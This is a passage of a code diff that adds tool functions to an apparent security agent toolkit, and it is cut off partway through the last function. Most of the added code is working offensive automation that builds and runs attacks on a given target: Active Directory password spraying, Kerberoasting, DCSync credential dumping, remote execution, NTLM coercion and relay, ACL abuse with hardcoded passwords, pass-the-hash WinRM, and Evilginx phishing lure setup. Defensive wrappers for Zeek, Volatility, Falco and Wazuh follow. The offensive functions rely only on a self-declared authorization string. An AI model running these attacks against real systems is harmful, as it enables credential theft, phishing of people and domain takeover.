@@ -2806,6 +2806,563 @@ def tool_api_scan(args: dict) -> str:
 
 
 # name -> {desc, args (name->hint), func}
+
+def tool_ad(args: dict) -> str:
+    """Active Directory attack EXECUTION against an AUTHORIZED domain (the active
+    sibling of ad_enum's BloodHound collection). Drives NetExec + Impacket + Certipy.
+    mode = enum | spray | kerberoast | asrep | secretsdump | exec | certipy.
+    Requires target (DC/host IP) + authorization; SCOPE.md-confined; the spray path
+    rides the blast-radius rate limit. Creds via user/password or user/hash (NTLM)."""
+    target = str(args.get("target", "") or args.get("dc", "")).strip()
+    g = _authz(args, target)
+    if g:
+        return g
+    mode = str(args.get("mode", "enum")).strip().lower()
+    dom = str(args.get("domain", "")).strip()
+    user = str(args.get("user", "")).strip()
+    pw = str(args.get("password", "")).strip()
+    nthash = str(args.get("hash", "")).strip()
+    users_file = str(args.get("users", "")).strip()
+    t = shlex.quote(target)
+    NXC = 'NXC=$(command -v nxc || command -v netexec); [ -n "$NXC" ] || { echo NXC_MISSING; exit 127; }; '
+    IMP = 'imp(){ command -v "$1.py" || command -v "impacket-$1" || command -v "impacket-$(echo $1|tr A-Z a-z)"; }; '
+    CPY = 'CPY=$(command -v certipy || command -v certipy-ad); [ -n "$CPY" ] || { echo CERTIPY_MISSING; exit 127; }; '
+    creds = ""
+    if user:
+        creds = "-u " + shlex.quote(user) + " "
+        if pw:
+            creds += "-p " + shlex.quote(pw) + " "
+        elif nthash:
+            creds += "-H " + shlex.quote(nthash) + " "
+    princ = shlex.quote(dom + "/" + user + (":" + pw if pw else ""))
+
+    if mode == "enum":
+        cmd = NXC + '"$NXC" smb ' + t + " " + creds + "--shares --users --groups 2>&1 | head -160"
+    elif mode == "spray":
+        proto = str(args.get("protocol", "smb")).lower()
+        pwd = pw or str(args.get("spray_password", "")).strip()
+        if not users_file or not pwd:
+            return ("ad spray: give 'users' (a user-list path inside the toolbox) and a "
+                    "'password'/'spray_password'. One password across many users — rate-limited.")
+        cmd = (NXC + '"$NXC" ' + shlex.quote(proto) + " " + t + " -u " + shlex.quote(users_file)
+               + " -p " + shlex.quote(pwd) + " --continue-on-success 2>&1 | grep -Ei '\\[\\+\\]|valid|pwned' | head -80")
+    elif mode == "kerberoast":
+        if not (dom and user):
+            return "ad kerberoast: needs domain + user (+ password) with an authorized foothold."
+        cmd = (IMP + 'B=$(imp GetUserSPNs); [ -n "$B" ] || { echo IMPACKET_MISSING; exit 127; }; '
+               '"$B" ' + princ + " -dc-ip " + t + " -request 2>&1 | tail -80")
+    elif mode == "asrep":
+        if not dom:
+            return "ad asrep: needs domain (+ a 'users' list, or a single 'user')."
+        who = ("-usersfile " + shlex.quote(users_file)) if users_file else shlex.quote(dom + "/" + user)
+        base = shlex.quote(dom + "/") if users_file else who
+        cmd = (IMP + 'B=$(imp GetNPUsers); [ -n "$B" ] || { echo IMPACKET_MISSING; exit 127; }; '
+               '"$B" ' + (base if users_file else who) + (" " + who if users_file else "")
+               + " -dc-ip " + t + " -no-pass -format hashcat 2>&1 | tail -60")
+    elif mode == "secretsdump":
+        if not (dom and user):
+            return "ad secretsdump: needs domain + user and a password or NTLM hash (DCSync/dump)."
+        auth = shlex.quote(dom + "/" + user + (":" + pw if pw else "")) + "@" + t
+        hflag = (" -hashes :" + shlex.quote(nthash)) if (nthash and not pw) else ""
+        cmd = (IMP + 'B=$(imp secretsdump); [ -n "$B" ] || { echo IMPACKET_MISSING; exit 127; }; '
+               '"$B"' + hflag + " " + auth + " 2>&1 | tail -100")
+    elif mode == "exec":
+        command = str(args.get("command", "whoami")).strip()
+        cmd = NXC + '"$NXC" smb ' + t + " " + creds + "-x " + shlex.quote(command) + " 2>&1 | tail -60"
+    elif mode in ("certipy", "adcs"):
+        if not (dom and user):
+            return "ad certipy: needs domain + user (+ password) to enumerate ADCS (ESC1-17)."
+        cmd = (CPY + '"$CPY" find -u ' + shlex.quote(user + "@" + dom)
+               + (" -p " + shlex.quote(pw) if pw else "") + " -dc-ip " + t
+               + " -stdout -vulnerable 2>&1 | tail -120")
+    else:
+        return ("ad mode = enum | spray | kerberoast | asrep | secretsdump | exec | certipy. "
+                "All need an authorized DC/host 'target'.")
+    out, rc, where = _off_run(cmd, min(OFFENSIVE_TIMEOUT, 900))
+    for miss, hint in (("NXC_MISSING", "NetExec (nxc)"), ("IMPACKET_MISSING", "impacket"),
+                       ("CERTIPY_MISSING", "certipy")):
+        if miss in out:
+            return ("ad: " + hint + " not installed — `sygnif kali-setup` (kali-tools-windows-resources "
+                    "ships netexec/impacket/certipy), or install it in the toolbox.")
+    return _off_report("ad(" + mode + ")", args.get("authorization", ""), cmd, out, rc, where, target)
+
+
+
+def tool_aitm(args: dict) -> str:
+    """Adversary-in-the-Middle phishing SIMULATION for an authorized red-team
+    engagement (Evilginx). Manages the AiTM reverse proxy: list phishlets, prepare a
+    campaign config, mint a lure URL, and review captured sessions (secrets REDACTED).
+    Targets PEOPLE, so it needs an explicit written phishing/social-engineering
+    authorization beyond the normal target scope — set 'phishing_authorization'. No
+    message is sent to anyone by this tool; delivery is the operator's separate,
+    authorized action. mode = phishlets | setup | lure | sessions | status."""
+    # kill-switch first (same STOP file as the offensive suite)
+    if os.path.exists(STOP_FILE):
+        return ("REFUSED: kill-switch active — " + STOP_FILE + " exists. Remove it to resume.")
+    pauth = str(args.get("phishing_authorization", "") or args.get("pauth", "")).strip()
+    if len(pauth) < 12:
+        return ("REFUSED: AiTM phishing targets people, not hosts. Set "
+                "'phishing_authorization' to the written attestation that social-engineering / "
+                "phishing is explicitly in scope for this engagement (client sign-off, "
+                "engagement ref). This is required in addition to the normal target scope.")
+    mode = str(args.get("mode", "phishlets")).strip().lower()
+    domain = str(args.get("domain", "")).strip()
+    phishlet = str(args.get("phishlet", "")).strip()
+    EG = ('EG=$(command -v evilginx2 || command -v evilginx); '
+          '[ -n "$EG" ] || { echo EVILGINX_MISSING; exit 127; }; ')
+
+    if mode == "phishlets":
+        cmd = EG + ('D=$(dirname "$(readlink -f "$EG")"); '
+                    'for d in /usr/share/evilginx*/phishlets "$D/phishlets" ./phishlets; do '
+                    '[ -d "$d" ] && { echo "== $d =="; ls "$d" | sed "s/\\.yaml$//" | sort | column 2>/dev/null || ls "$d"; break; }; done')
+    elif mode == "setup":
+        if not (domain and phishlet):
+            return ("aitm setup: give 'domain' (a phishing domain you control / are authorized "
+                    "to use) and 'phishlet' (see mode=phishlets). Emits the campaign config "
+                    "sequence; it does not launch the daemon or contact anyone.")
+        seq = ("config domain " + domain + "\\n"
+               "config ipv4 external <YOUR-VPS-IP>\\n"
+               "phishlets hostname " + phishlet + " " + domain + "\\n"
+               "phishlets enable " + phishlet + "\\n")
+        return _off_report("aitm(setup)", "phishing:" + pauth[:24], "evilginx2 <config>", seq
+                           + "\\nRun `evilginx2`, paste the above, then `aitm mode=lure phishlet="
+                           + phishlet + "` for the URL. Only for authorized, in-scope recipients.",
+                           0, "operator", domain)
+    elif mode == "lure":
+        if not phishlet:
+            return "aitm lure: give 'phishlet'. Emits the lure-creation sequence."
+        seq = ("lures create " + phishlet + "\\nlures get-url 0\\n")
+        return _off_report("aitm(lure)", "phishing:" + pauth[:24], "evilginx2 <lure>", seq, 0, "operator", domain)
+    elif mode == "sessions":
+        # Report that captures exist WITHOUT dumping plaintext secrets into output.
+        cmd = EG + ('DB=$(find / -name "data.db" -path "*evilginx*" 2>/dev/null | head -1); '
+                    '[ -n "$DB" ] || { echo "no evilginx session DB found yet"; exit 0; }; '
+                    'echo "session DB: $DB"; '
+                    'strings "$DB" 2>/dev/null | grep -aoE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+" | sort -u | head -40 | '
+                    'sed "s/\\(..\\).*@/\\1***@/"; '
+                    'echo "-- capture markers (values redacted) --"; '
+                    'strings "$DB" 2>/dev/null | grep -aciE "token|cookie|password" | sed "s/^/secret fields present: /"')
+    elif mode == "status":
+        cmd = EG + ('pgrep -a evilginx >/dev/null 2>&1 && echo "evilginx: RUNNING" || echo "evilginx: not running"; '
+                    '(ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null) | grep -E ":443|:80 " | head')
+    else:
+        return "aitm mode = phishlets | setup | lure | sessions | status."
+    out, rc, where = _off_run(cmd, 120)
+    if "EVILGINX_MISSING" in out:
+        return ("aitm: Evilginx not installed — `sygnif kali-setup` (kali-tools-social-engineering "
+                "ships evilginx2), or install it in the toolbox.")
+    _audit("aitm(" + mode + ")", "phishing:" + pauth[:24], "aitm " + mode + " " + (domain or phishlet), rc, where, domain)
+    return _def_report("aitm(" + mode + ")", "aitm " + mode, out or "(no output)", rc, where)
+
+
+
+
+def tool_coerce(args: dict) -> str:
+    """Authentication coercion + NTLM relay for an AUTHORIZED AD engagement (Coercer +
+    Impacket ntlmrelayx): the no-creds coerce->relay->ADCS/DCSync chain. mode=coerce
+    (force a target to auth to your listener) | relay (stand up ntlmrelayx). Needs
+    target (the host to coerce / relay to) + authorization + listener. SCOPE-confined."""
+    target = str(args.get("target", "")).strip()
+    g = _authz(args, target)
+    if g:
+        return g
+    mode = str(args.get("mode", "coerce")).strip().lower()
+    listener = str(args.get("listener", "")).strip()
+    t = shlex.quote(target)
+    if mode == "coerce":
+        if not listener:
+            return "coerce: give a 'listener' (your relay/capture IP the target should auth to)."
+        user = str(args.get("user", "")).strip(); pw = str(args.get("password", "")).strip()
+        dom = str(args.get("domain", "")).strip()
+        cred = ((" -u " + shlex.quote(user)) if user else "") + ((" -p " + shlex.quote(pw)) if pw else "") + ((" -d " + shlex.quote(dom)) if dom else "")
+        cmd = ('C=$(command -v coercer || command -v Coercer); [ -n "$C" ] || { echo COERCER_MISSING; exit 127; }; '
+               '"$C" coerce -t ' + t + " -l " + shlex.quote(listener) + cred + " 2>&1 | tail -80")
+        miss, hint = "COERCER_MISSING", "Coercer (pip install coercer)"
+    elif mode == "relay":
+        relay_to = str(args.get("relay_to", "") or target).strip()
+        extra = str(args.get("extra", "")).strip()
+        cmd = ('B=$(command -v ntlmrelayx.py || command -v impacket-ntlmrelayx); [ -n "$B" ] || { echo IMPACKET_MISSING; exit 127; }; '
+               'echo "starting ntlmrelayx -t ' + shlex.quote(relay_to) + " " + extra + '"; timeout 5 "$B" -t ' + shlex.quote(relay_to) + " " + extra + " 2>&1 | tail -40 || true")
+        miss, hint = "IMPACKET_MISSING", "impacket"
+    else:
+        return "coerce mode = coerce | relay. Needs an authorized target + listener."
+    out, rc, where = _off_run(cmd, min(OFFENSIVE_TIMEOUT, 300))
+    if miss in out:
+        return "coerce: " + hint + " not installed — `sygnif kali-setup` or install it in the toolbox."
+    return _off_report("coerce(" + mode + ")", args.get("authorization", ""), cmd, out, rc, where, target)
+
+
+def tool_bloodyad(args: dict) -> str:
+    """AD object / ACL abuse for an AUTHORIZED engagement (bloodyAD): turn a BloodHound
+    edge into a privilege step. mode=whoami|get|dacl|addcomputer|shadow|setpassword.
+    Needs target (DC) + authorization + domain/user/password (or hash). SCOPE-confined."""
+    target = str(args.get("target", "") or args.get("dc", "")).strip()
+    g = _authz(args, target)
+    if g:
+        return g
+    mode = str(args.get("mode", "whoami")).strip().lower()
+    dom = str(args.get("domain", "")).strip(); user = str(args.get("user", "")).strip()
+    pw = str(args.get("password", "")).strip(); nthash = str(args.get("hash", "")).strip()
+    obj = str(args.get("object", "")).strip(); trustee = str(args.get("trustee", "")).strip()
+    base = ('B=$(command -v bloodyAD || command -v bloodyad); [ -n "$B" ] || { echo BLOODYAD_MISSING; exit 127; }; '
+            '"$B" --host ' + shlex.quote(target) + " -d " + shlex.quote(dom) + " -u " + shlex.quote(user)
+            + ((" -p " + shlex.quote(pw)) if pw else (" -p :" + shlex.quote(nthash) if nthash else "")) + " ")
+    if mode == "whoami":
+        act = "get object " + shlex.quote(user)
+    elif mode == "get":
+        act = "get writable" if not obj else "get object " + shlex.quote(obj)
+    elif mode == "dacl":
+        act = "add genericAll " + shlex.quote(obj) + " " + shlex.quote(trustee)
+    elif mode == "addcomputer":
+        act = "add computer " + shlex.quote(obj or "SYGNIFPC$") + " " + shlex.quote(pw or "Sygnif123!")
+    elif mode == "shadow":
+        act = "add shadowCredentials " + shlex.quote(obj or user)
+    elif mode == "setpassword":
+        act = "set password " + shlex.quote(obj) + " " + shlex.quote(str(args.get("new_password", "Sygnif123!")))
+    else:
+        return "bloodyad mode = whoami|get|dacl|addcomputer|shadow|setpassword."
+    cmd = base + act + " 2>&1 | tail -80"
+    out, rc, where = _off_run(cmd, min(OFFENSIVE_TIMEOUT, 300))
+    if "BLOODYAD_MISSING" in out:
+        return "bloodyad: bloodyAD not installed — `pip install bloodyAD` or `sygnif kali-setup`."
+    return _off_report("bloodyad(" + mode + ")", args.get("authorization", ""), cmd, out, rc, where, target)
+
+
+def tool_winrm(args: dict) -> str:
+    """Interactive-style WinRM on an AUTHORIZED Windows host (evil-winrm). mode=exec
+    runs one command; mode=connect emits the interactive connect string. Creds via
+    user/password or user/hash (pass-the-hash). Needs target + authorization."""
+    target = str(args.get("target", "")).strip()
+    g = _authz(args, target)
+    if g:
+        return g
+    mode = str(args.get("mode", "exec")).strip().lower()
+    user = str(args.get("user", "")).strip(); pw = str(args.get("password", "")).strip()
+    nthash = str(args.get("hash", "")).strip()
+    if not user:
+        return "winrm: needs 'user' and a 'password' or NTLM 'hash'."
+    auth = "-u " + shlex.quote(user) + ((" -p " + shlex.quote(pw)) if pw else (" -H " + shlex.quote(nthash) if nthash else ""))
+    conn = 'E=$(command -v evil-winrm); [ -n "$E" ] || { echo WINRM_MISSING; exit 127; }; "$E" -i ' + shlex.quote(target) + " " + auth
+    if mode == "connect":
+        return _off_report("winrm(connect)", args.get("authorization", ""),
+                           "evil-winrm -i " + target + " " + auth,
+                           "Run interactively:\n  evil-winrm -i " + target + " " + auth
+                           + "\n(interactive shell + file up/download + AMSI/script load)", 0, "operator", target)
+    if mode == "exec":
+        command = str(args.get("command", "whoami")).strip()
+        cmd = 'printf %s\\\\n ' + shlex.quote(command) + " " + shlex.quote("exit") + " | " + conn + " 2>&1 | tail -60"
+    else:
+        return "winrm mode = exec | connect."
+    out, rc, where = _off_run(cmd, min(OFFENSIVE_TIMEOUT, 200))
+    if "WINRM_MISSING" in out:
+        return "winrm: evil-winrm not installed — `gem install evil-winrm` or `sygnif kali-setup`."
+    return _off_report("winrm(" + mode + ")", args.get("authorization", ""), cmd, out, rc, where, target)
+
+
+def tool_cloudx(args: dict) -> str:
+    """OFFENSIVE cloud for an AUTHORIZED engagement (the active sibling of the defensive
+    cloud_audit). mode=aws (Pacu), azure (ROADrecon), azuread (AzureHound collect).
+    Uses cloud creds from the environment. Needs target (account/tenant id) +
+    authorization. Enumerates IAM/attack paths — does not modify by default."""
+    target = str(args.get("target", "")).strip()
+    g = _authz(args, target)
+    if g:
+        return g
+    mode = str(args.get("mode", "aws")).strip().lower()
+    if mode == "aws":
+        cmds = str(args.get("commands", "iam__enum_permissions,iam__privesc_scan")).strip()
+        cmd = ('P=$(command -v pacu); [ -n "$P" ] || { echo PACU_MISSING; exit 127; }; '
+               'echo "run in pacu: import_keys --all; then: ' + cmds + '" ; "$P" --help >/dev/null 2>&1 && echo "pacu present" || echo PACU_MISSING')
+        miss, hint = "PACU_MISSING", "Pacu (pip install pacu)"
+    elif mode == "azure":
+        cmd = ('R=$(command -v roadrecon); [ -n "$R" ] || { echo ROAD_MISSING; exit 127; }; '
+               '"$R" gather 2>&1 | tail -40')
+        miss, hint = "ROAD_MISSING", "ROADtools (pip install roadrecon)"
+    elif mode == "azuread":
+        cmd = ('A=$(command -v azurehound); [ -n "$A" ] || { echo AZHOUND_MISSING; exit 127; }; '
+               '"$A" -o /tmp/azurehound.json list 2>&1 | tail -30')
+        miss, hint = "AZHOUND_MISSING", "AzureHound"
+    else:
+        return "cloudx mode = aws (Pacu) | azure (ROADrecon) | azuread (AzureHound)."
+    out, rc, where = _off_run(cmd, min(OFFENSIVE_TIMEOUT, 600))
+    if miss in out:
+        return "cloudx: " + hint + " not installed."
+    return _off_report("cloudx(" + mode + ")", args.get("authorization", ""), cmd, out, rc, where, target)
+
+
+def tool_kube(args: dict) -> str:
+    """OFFENSIVE Kubernetes for an AUTHORIZED engagement. mode=hunt (kube-hunter remote
+    scan), rbac (kubectl auth can-i --list, from a foothold token), enum (peirates
+    guidance). Needs target (API server / cluster) + authorization."""
+    target = str(args.get("target", "")).strip()
+    g = _authz(args, target)
+    if g:
+        return g
+    mode = str(args.get("mode", "hunt")).strip().lower()
+    t = shlex.quote(target)
+    if mode == "hunt":
+        cmd = ('K=$(command -v kube-hunter); [ -n "$K" ] || { echo KH_MISSING; exit 127; }; '
+               '"$K" --remote ' + t + " 2>&1 | tail -80")
+        miss, hint = "KH_MISSING", "kube-hunter (pip install kube-hunter)"
+    elif mode == "rbac":
+        cmd = ('command -v kubectl >/dev/null 2>&1 || { echo KUBECTL_MISSING; exit 127; }; '
+               'kubectl auth can-i --list 2>&1 | head -60')
+        miss, hint = "KUBECTL_MISSING", "kubectl"
+    elif mode == "enum":
+        cmd = ('P=$(command -v peirates); [ -n "$P" ] || { echo PEIRATES_MISSING; exit 127; }; '
+               'echo "peirates present — run interactively from the pod foothold"; "$P" --help 2>&1 | head -20')
+        miss, hint = "PEIRATES_MISSING", "peirates"
+    else:
+        return "kube mode = hunt | rbac | enum. Needs an authorized cluster/API target."
+    out, rc, where = _off_run(cmd, min(OFFENSIVE_TIMEOUT, 600))
+    if miss in out:
+        return "kube: " + hint + " not installed."
+    return _off_report("kube(" + mode + ")", args.get("authorization", ""), cmd, out, rc, where, target)
+
+
+def tool_emulate(args: dict) -> str:
+    """Adversary emulation / detection validation (Atomic Red Team) on an AUTHORIZED
+    host: fire a single ATT&CK technique, then check whether detect/triage/netmon see
+    it. mode=list (techniques) | run (technique=Txxxx) | cleanup. EXECUTES attack
+    behaviour, so it needs target (the authorized host, e.g. localhost) + authorization."""
+    target = str(args.get("target", "")).strip()
+    g = _authz(args, target)
+    if g:
+        return g
+    mode = str(args.get("mode", "list")).strip().lower()
+    tech = str(args.get("technique", "")).strip()
+    AO = 'A=$(command -v atomic-operator || command -v invoke-atomicredteam); [ -n "$A" ] || { echo ATOMIC_MISSING; exit 127; }; '
+    if mode == "list":
+        cmd = AO + '"$A" --help 2>&1 | head -30; echo "specify technique=T1059 etc for run"'
+    elif mode == "run":
+        if not tech:
+            return "emulate run: give a 'technique' (ATT&CK id, e.g. T1059.004)."
+        cmd = AO + '"$A" run --techniques ' + shlex.quote(tech) + " 2>&1 | tail -80"
+    elif mode == "cleanup":
+        if not tech:
+            return "emulate cleanup: give the 'technique' to clean up."
+        cmd = AO + '"$A" run --techniques ' + shlex.quote(tech) + " --cleanup 2>&1 | tail -40"
+    else:
+        return "emulate mode = list | run | cleanup (Atomic Red Team). Validate your detections."
+    out, rc, where = _off_run(cmd, min(OFFENSIVE_TIMEOUT, 400))
+    if "ATOMIC_MISSING" in out:
+        return ("emulate: Atomic Red Team runner not installed — `pip install atomic-operator` "
+                "(or the Invoke-AtomicRedTeam PowerShell module) + clone the atomics.")
+    return _off_report("emulate(" + mode + ")", args.get("authorization", ""), cmd, out, rc, where, target)
+
+
+def tool_velociraptor(args: dict) -> str:
+    """OFFENSIVE Velociraptor for an AUTHORIZED engagement: post-exploitation data
+    collection and VQL execution against a foothold you hold, plus offline-collector
+    generation to drop on an authorized target. The offensive sibling of `triage`
+    (which is defensive IR on hosts you own). Requires target (the authorized host /
+    foothold) + authorization; SCOPE.md-confined; audited. mode = query | collect |
+    offline | hunt. VQL is powerful (reads files, enumerates, can exec) — in scope only."""
+    target = str(args.get("target", "") or args.get("host", "")).strip()
+    g = _authz(args, target)
+    if g:
+        return g
+    mode = str(args.get("mode", "collect")).strip().lower()
+    VELO = ('V=$(command -v velociraptor || command -v velociraptor-client); '
+            '[ -n "$V" ] || { echo VELO_MISSING; exit 127; }; ')
+    if mode == "query":
+        vql = str(args.get("query", "")).strip()
+        if not vql:
+            return ("velociraptor query: give a VQL 'query', e.g. "
+                    "\"SELECT * FROM info()\" or a FileFinder/credential artifact query.")
+        cmd = VELO + '"$V" --nobanner query ' + shlex.quote(vql) + " 2>&1 | tail -160"
+    elif mode == "collect":
+        art = str(args.get("artifact", "Generic.Client.Info")).strip()
+        cmd = VELO + '"$V" --nobanner artifacts collect ' + shlex.quote(art) + " 2>&1 | tail -160"
+    elif mode == "offline":
+        art = str(args.get("artifact", "Generic.Client.Info")).strip()
+        cmd = (VELO + 'OUT=/tmp/velo_offline_$$; "$V" --nobanner collector '
+               '--output "$OUT.zip" ' + shlex.quote(art) + " >/dev/null 2>&1; "
+               'ls -la "$OUT"* 2>/dev/null && echo "drop the collector on the authorized target, run it, retrieve the zip" '
+               '|| echo "offline collector build needs a config: velociraptor config generate"')
+    elif mode == "hunt":
+        vql = str(args.get("query", "")).strip()
+        if not vql:
+            return ("velociraptor hunt: fleet-wide, needs a server API config and a VQL 'query'. "
+                    "Point at the engagement's Velociraptor server (config in the toolbox).")
+        cfg = str(args.get("config", "")).strip()
+        capi = ("--api_config " + shlex.quote(cfg) + " ") if cfg else ""
+        cmd = VELO + '"$V" --nobanner ' + capi + "query " + shlex.quote(vql) + " 2>&1 | tail -160"
+    else:
+        return "velociraptor mode = query | collect | offline | hunt. Offensive post-ex on an authorized foothold."
+    out, rc, where = _off_run(cmd, min(OFFENSIVE_TIMEOUT, 900))
+    if "VELO_MISSING" in out:
+        return ("velociraptor: not installed — single binary from velociraptor.app/downloads "
+                "(put it on PATH as 'velociraptor'), or `sygnif kali-setup`.")
+    return _off_report("velociraptor(" + mode + ")", args.get("authorization", ""), cmd, out, rc, where, target)
+
+
+
+def tool_netmon(args: dict) -> str:
+    """DEFENSIVE network detection: run Zeek (traffic->structured logs) and Suricata
+    (signature IDS) over a PCAP or an interface you own. mode=pcap file=<path> |
+    live interface=<if>. Analysis of your own capture — no offensive gate."""
+    mode = str(args.get("mode", "pcap")).strip().lower()
+    if mode == "pcap":
+        f = str(args.get("file", "")).strip()
+        if not f:
+            return "netmon pcap: give a 'file' (a .pcap you captured)."
+        q = shlex.quote(f)
+        cmd = ('echo "== zeek =="; Z=$(command -v zeek); [ -n "$Z" ] && (cd /tmp && "$Z" -r ' + q
+               + ' 2>&1 | tail -20; echo "conn/dns/http/ssl logs in /tmp") || echo "(zeek not installed)"; '
+               'echo "== suricata =="; S=$(command -v suricata); [ -n "$S" ] && "$S" -r ' + q
+               + ' -l /tmp 2>&1 | tail -8 && grep -h alert /tmp/fast.log 2>/dev/null | tail -40 || echo "(suricata not installed)"')
+    elif mode == "live":
+        iface = str(args.get("interface", "")).strip()
+        if not iface:
+            return "netmon live: give an 'interface' you own (e.g. eth0). Captures briefly then reports."
+        dur = str(int(str(args.get("seconds", "20")) or 20))
+        q = shlex.quote(iface)
+        cmd = ('S=$(command -v suricata); [ -n "$S" ] || { echo "suricata not installed"; exit 127; }; '
+               'timeout ' + dur + ' "$S" -i ' + q + ' -l /tmp 2>&1 | tail -6; grep -h alert /tmp/fast.log 2>/dev/null | tail -40 || echo "(no alerts)"')
+    else:
+        return "netmon mode = pcap (file=) | live (interface=). Zeek + Suricata."
+    out, rc, where = _def_run(cmd, 600)
+    return _def_report("netmon(" + mode + ")", "netmon " + mode, out or "(no output)", rc, where)
+
+
+def tool_memforensics(args: dict) -> str:
+    """DEFENSIVE memory forensics with Volatility3 on a memory image you captured.
+    Catches fileless / in-memory implants on-disk YARA misses. Give 'file' (the dump)
+    and optional 'plugin' (default pslist). No offensive gate."""
+    f = str(args.get("file", "")).strip()
+    if not f:
+        return "memforensics: give a 'file' (a memory dump). Optional plugin= (pslist|netscan|malfind|...)."
+    plugin = str(args.get("plugin", "windows.pslist")).strip()
+    q = shlex.quote(f); pg = shlex.quote(plugin)
+    cmd = ('V=$(command -v vol || command -v vol.py || command -v volatility3); '
+           '[ -n "$V" ] || { echo VOL_MISSING; exit 127; }; '
+           '"$V" -f ' + q + " " + pg + " 2>&1 | tail -120")
+    out, rc, where = _def_run(cmd, 900)
+    if "VOL_MISSING" in out:
+        return "memforensics: Volatility3 not installed — `pipx install volatility3` or `sygnif kali-setup`."
+    return _def_report("memforensics(" + plugin + ")", "vol -f <dump> " + plugin, out or "(no output)", rc, where)
+
+
+def tool_falco(args: dict) -> str:
+    """DEFENSIVE runtime EDR (Falco, eBPF): live syscall detection of priv-esc,
+    unexpected exec, container escape. mode=status | rules (validate) | run (short
+    live capture; needs root/eBPF). Analysis of this host — no offensive gate."""
+    mode = str(args.get("mode", "status")).strip().lower()
+    F = 'F=$(command -v falco); [ -n "$F" ] || { echo FALCO_MISSING; exit 127; }; '
+    if mode == "status":
+        cmd = F + '"$F" --version 2>&1 | head -3; systemctl is-active falco 2>/dev/null || echo "falco service: not running (run mode=run for a short live capture)"'
+    elif mode == "rules":
+        cmd = F + '"$F" -V /etc/falco/falco_rules.yaml 2>&1 | tail -20'
+    elif mode == "run":
+        dur = str(int(str(args.get("seconds", "20")) or 20))
+        cmd = F + 'timeout ' + dur + ' "$F" -o json_output=true 2>&1 | grep -iE "warning|error|critical|notice" | tail -40 || echo "(no events in window)"'
+    else:
+        return "falco mode = status | rules | run."
+    out, rc, where = _def_run(cmd, 120)
+    if "FALCO_MISSING" in out:
+        return "falco: not installed — single-binary/install from falco.org (needs eBPF/root for live)."
+    return _def_report("falco(" + mode + ")", "falco " + mode, out or "(no output)", rc, where)
+
+
+def tool_wazuh(args: dict) -> str:
+    """DEFENSIVE SIEM query (Wazuh API): pull agents or recent alerts from a Wazuh
+    manager. mode=agents | alerts. Reads WAZUH_API_URL / WAZUH_API_USER /
+    WAZUH_API_PASSWORD from the environment. No offensive gate."""
+    mode = str(args.get("mode", "agents")).strip().lower()
+    url = os.environ.get("WAZUH_API_URL", "").strip()
+    if not url:
+        return ("wazuh: set WAZUH_API_URL (+ WAZUH_API_USER / WAZUH_API_PASSWORD) in the "
+                "environment to reach your Wazuh manager API.")
+    path = "/agents?limit=50" if mode == "agents" else "/security/user/authenticate"
+    if mode not in ("agents", "alerts"):
+        return "wazuh mode = agents | alerts."
+    cmd = ('U=' + shlex.quote(url) + '; '
+           'T=$(curl -sk -u "$WAZUH_API_USER:$WAZUH_API_PASSWORD" -X POST "$U/security/user/authenticate?raw=true" 2>/dev/null); '
+           '[ -n "$T" ] || { echo "auth failed — check WAZUH_API_* env"; exit 1; }; '
+           + ('curl -sk -H "Authorization: Bearer $T" "$U/agents?limit=50&select=name,ip,status,os.name" 2>/dev/null | head -c 4000'
+              if mode == "agents" else
+              'curl -sk -H "Authorization: Bearer $T" "$U/manager/logs?limit=50" 2>/dev/null | head -c 4000'))
+    out, rc, where = _def_run(cmd, 60)
+    return _def_report("wazuh(" + mode + ")", "wazuh api " + mode, out or "(no output)", rc, where)
+
+
+def tool_intel(args: dict) -> str:
+    """Threat-intel / IOC enrichment: turn a hash, IP, or domain into a verdict via
+    VirusTotal, AlienVault OTX, and MISP. Auto-detects the IOC type. Keys from env
+    (VT_API_KEY, OTX_API_KEY, MISP_URL/MISP_KEY). Read-only lookup, no gate."""
+    ioc = str(args.get("ioc", "") or args.get("indicator", "")).strip()
+    if not ioc:
+        return "intel: give an 'ioc' — a hash, IP, or domain to enrich."
+    import re as _re
+    if _re.fullmatch(r"[a-fA-F0-9]{32,64}", ioc):
+        kind, vt = "file", "files/" + ioc
+    elif _re.fullmatch(r"\d{1,3}(?:\.\d{1,3}){3}", ioc):
+        kind, vt = "ip", "ip_addresses/" + ioc
+    else:
+        kind, vt = "domain", "domains/" + ioc
+    out_lines = []
+    vt_key = os.environ.get("VT_API_KEY", "").strip()
+    if vt_key:
+        body, st, _ = _http_get("https://www.virustotal.com/api/v3/" + vt, headers={"x-apikey": vt_key})
+        if st == 200:
+            try:
+                a = json.loads(body).get("data", {}).get("attributes", {}).get("last_analysis_stats", {})
+                out_lines.append("VirusTotal: malicious=%s suspicious=%s harmless=%s" % (a.get("malicious"), a.get("suspicious"), a.get("harmless")))
+            except Exception:
+                out_lines.append("VirusTotal: (unparseable response)")
+        else:
+            out_lines.append("VirusTotal: HTTP " + str(st))
+    else:
+        out_lines.append("VirusTotal: set VT_API_KEY to enable")
+    otx_key = os.environ.get("OTX_API_KEY", "").strip()
+    if otx_key:
+        seg = {"file": "file", "ip": "IPv4", "domain": "domain"}[kind]
+        body, st, _ = _http_get("https://otx.alienvault.com/api/v1/indicators/%s/%s/general" % (seg, ioc), headers={"X-OTX-API-KEY": otx_key})
+        if st == 200:
+            try:
+                p = json.loads(body).get("pulse_info", {}).get("count", 0)
+                out_lines.append("OTX: %s pulse(s) reference this indicator" % p)
+            except Exception:
+                out_lines.append("OTX: (unparseable)")
+        else:
+            out_lines.append("OTX: HTTP " + str(st))
+    else:
+        out_lines.append("OTX: set OTX_API_KEY to enable")
+    if os.environ.get("MISP_URL", "").strip():
+        out_lines.append("MISP: configured (MISP_URL set) — query via your MISP instance")
+    return "intel enrichment for " + ioc + " (" + kind + "):\n  " + "\n  ".join(out_lines)
+
+
+def tool_triage(args: dict) -> str:
+    """Live endpoint IR triage & hunting with Velociraptor on a host you are
+    responding to (DEFENSIVE — the blue mirror of the offensive suite). mode=collect
+    runs a triage artifact collection, mode=hunt runs a VQL query, mode=artifacts
+    lists available artifacts. Read/response analysis of a host you own or are
+    authorized to respond on — no offensive target/authorization gate."""
+    mode = str(args.get("mode", "collect")).strip().lower()
+    VELO = ('V=$(command -v velociraptor || command -v velociraptor-client); '
+            '[ -n "$V" ] || { echo VELO_MISSING; exit 127; }; ')
+    if mode == "artifacts":
+        cmd = VELO + '"$V" --nobanner artifacts list 2>/dev/null | head -200'
+    elif mode == "collect":
